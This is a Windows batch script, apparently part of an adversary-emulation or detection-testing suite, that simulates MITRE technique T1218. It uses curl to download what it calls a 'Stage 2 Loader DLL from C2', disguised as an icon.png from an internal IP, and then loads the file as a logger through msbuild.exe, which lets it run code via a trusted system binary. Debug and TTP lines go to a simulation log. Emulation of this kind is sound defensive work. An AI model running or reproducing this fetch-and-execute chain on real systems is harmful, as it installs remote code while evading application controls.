@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFg1=%APPDATA%\11452\21b453c6
SET hIjKlMn2=bc73a8a8.txt
SET oPqRsTu3=https://10.0.0.49/stage/2/icon.png?11452-7
SET vWxYzAb4=ITZEL-S2B
SET cDeFgHi5=11452
SET jKlMnOp6=7
SET qRsTuVw7=%PUBLIC%\\macula-simulations.log
SET uVwXyZa8=https://10.0.0.49

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: heartbeat_start>> "!qRsTuVw7!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!aBcDeFg1!\!hIjKlMn2!" "!oPqRsTu3!"

REM Debug: heartbeat_complete (result 0 = success, 1 = failure)
if exist "!aBcDeFg1!\!hIjKlMn2!" (
    echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: heartbeat_complete=0>> "!qRsTuVw7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: heartbeat_complete=1>> "!qRsTuVw7!" 2>nul
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: chdir_start>> "!qRsTuVw7!" 2>nul

REM Position working directory to output directory
cd /d "!aBcDeFg1!" >nul 2>&1

REM Debug: chdir_result (errorlevel)
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: chdir_result=!errorlevel!>> "!qRsTuVw7!" 2>nul

REM Create .proj file for msbuild ILogger pattern
echo ^<Project/^> > "!aBcDeFg1!\build.proj"

REM Debug: proj_created
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: proj_created>> "!qRsTuVw7!" 2>nul

REM Invoke msbuild via /logger: switch — loads Stage 2 DLL as ILogger
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!aBcDeFg1!\build.proj" /logger:LoggerEntry,"!aBcDeFg1!\!hIjKlMn2!";MyParameters,Foo >nul 2>&1

set msbuild_error=!errorlevel!

REM Debug: msbuild_invoke
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: msbuild_invoke=!msbuild_error!>> "!qRsTuVw7!" 2>nul

REM Generate timestamp with millisecond precision for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM TTP log line (T1218^|System Binary Proxy Execution) — conditional on msbuild error
if !msbuild_error! EQU 0 (
    echo [!timestamp!][TTP][!vWxYzAb4!][!cDeFgHi5!]: T1218^|System Binary Proxy Execution=OK:>> "!qRsTuVw7!" 2>&1
) else (
    echo [!timestamp!][TTP][!vWxYzAb4!][!cDeFgHi5!]: T1218^|System Binary Proxy Execution=FAIL:error_code_!msbuild_error!>> "!qRsTuVw7!" 2>&1
)

REM Debug: log_complete
echo [!tsvar!][DEBUG][!vWxYzAb4!][!cDeFgHi5!]: log_complete>> "!qRsTuVw7!" 2>nul

endlocal